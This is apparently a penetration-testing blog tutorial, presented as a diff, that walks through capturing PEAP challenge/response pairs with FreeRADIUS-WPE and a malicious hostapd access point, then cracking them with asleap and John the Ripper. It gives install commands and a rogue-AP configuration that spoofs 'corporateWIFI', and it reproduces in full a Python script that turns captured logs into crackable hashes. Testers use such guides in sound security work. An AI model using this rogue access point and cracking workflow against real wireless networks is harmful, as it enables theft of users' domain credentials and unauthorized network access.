@@ -1,0 +1,121 @@
+
+Capturing and cracking a PEAP challenge/response with FreeRADIUS-WPE
+
+
+By Robert Portvliet.
+
+I figured I would put together a quick post on configuring and using FreeRADIUS-WPE, as lately I’ve seen a few people have issues getting it going on Backtrack 5 R2. To perform a successful attack we’re going to need a couple items, which are the updated FreeRADIUS-WPE package Brad Antoniewicz put together a few months back, and hostapd for our malicious AP. We’re also going to need to put together a .conf file for hostapd to run from. 
+
+After booting into Backtrack, go to http://blog.opensecurityresearch.com/2011/09/freeradius-wpe-updated.html, and download freeradius-server-wpe_2.1.11-1_i386.deb.
+
+To install, type:
+dpkg --install freeradius-server-wpe_2.1.11-1_i386.debThen:
+ldconfigNext install hostapd:
+apt-get install hostapd
+Run the FreeRADIUS-WPE setup from the Backtrack menu, which runs the following:
+
+sh -c "cd /pentest/libs/freeradius-wpe/raddb/certs && ./bootstrap && cp -r * /usr/local/etc/raddb/certs;sudo -s"
+The output should finish up looking something like this: 
+
+
+Then, we test that FreeRADIUS is working by:
+
+radiusd -X 
+("-X" turns on full debugging). It will scroll a bunch of information on the screen, and should end up with the following: 
+
+
+Next, we need a configuration file for hostapd to run from. Here is one Brad Antoniewicz put together a while ago: 
+
+interface=wlan0
+driver=nl80211
+ssid="corporateWIFI"
+logger_stdout=-1
+logger_stdout_level=0
+dump_file=/tmp/hostapd.dump
+ieee8021x=1
+eapol_key_index_workaround=0
+own_ip_addr=127.0.0.1
+auth_server_addr=127.0.0.1
+auth_server_port=1812
+auth_server_shared_secret=testing123
+wpa=1
+channel=1
+wpa_pairwise=TKIP CCMP
+Start a monitor mode interface with:
+
+airmon-ng start wlan0
+(or in my case wlan1), which will give you the mon0 monitor mode interface. 
+
+
+Next start hostapd and specify the configuration file: 
+
+
+Now that we have hostapd and FreeRADIUS-WPE running, connect to the “corporateWIFI” SSID with your test client and input your credentials. You should see activity in your hostapd window at this point, which will look something like this: 
+
+
+Your client will tell you the login failed (obviously), but if all goes well, when you tail the FreeRADIUS-WPE log, located at /usr/local/var/log/radius/freeradius-server-wpe.log, you’ll see the username, challenge, and response: 
+
+
+Finally, we can use asleap to attempt to crack the challenge/response. 
+
+
+Obviously, you are limited strictly to the words in your wordlist when using asleap, but if you want you can feed the challenge/response to John and use its mangling capabilities.  Josh Kelley created a neat Python script called radiusWPE2john.py, which I happened upon on pastebin (http://pastebin.com/RJwgbwNh) that takes the FreeRADIUS-WPE log output and converts the challenge/response into a format that John can understand. Here's a copy of it: 
+
+#!/usr/bin/python
+
+############################################################################### 
+# Free Radius WPE log file convertor to John The Ripper formatted file for 
+# password cracking.  Use the following format for John:
+# ./john --format=NETNTLM freeradius.john
+#
+# 12/19/2011 - Josh Kelley
+###############################################################################
+
+import sys
+
+if len(sys.argv) < 2:
+ print "Please feed me the path to the Free Radius WPE log file"
+ exit()
+
+fileIn = open(sys.argv[1],'r')
+fileOut = open('freeradius.john','w')
+
+i = 0
+for line in fileIn:
+ lineClean = line.strip()
+ lineSplit = lineClean.split(':')
+ if lineSplit[0] == "mschap":
+  i = i + 1
+ if lineSplit[0] == "username":
+  username = lineSplit[1].strip()
+  i = i + 1
+ if lineSplit[0] == "challenge":
+  challenge = ""
+  for x in lineSplit[1:]:
+   challenge = challenge + x
+  challenge = challenge.strip()
+  i = i + 1
+ if lineSplit[0] == "response":
+  response = ""
+  for x in lineSplit[1:]:  
+   response = response + x
+  response = response.strip()
+  i = i + 1
+ if i == 4:
+  lineNew = "%s:$NETNTLM$%s$%s" % (username, challenge, response) 
+  fileOut.write("%s\n" % lineNew.strip('\n'))
+  i = 0
+fileIn.close()
+fileOut.close()
+Run radiusWPE2john.py and point it to the FreeRADIUS-WPE log. It will generate the freeradius.john file with the challenge/ response converted to the proper formatting for John. 
+
+
+Then, simply feed John the freeradius.john file. The comments in RadiusWPE2John give the example of using the argument --format=NETNTLM, but John doesn’t seem to find the hashes when given it. It does find them when using no argument though.  (YMMV)
+
+
+Of course, you can also just pipe the output from John into asleap, as shown below. Make sure to include the dash after the –W switch for asleap. That makes the magic happen. Incidentally, you can do the same thing with CoWPAtty and Aircrack, in both cases putting a dash after the wordlist (-w) parameter let’s you take stdout from John to perform wordlist mangling. 
+
+
+Enjoy!
+
+
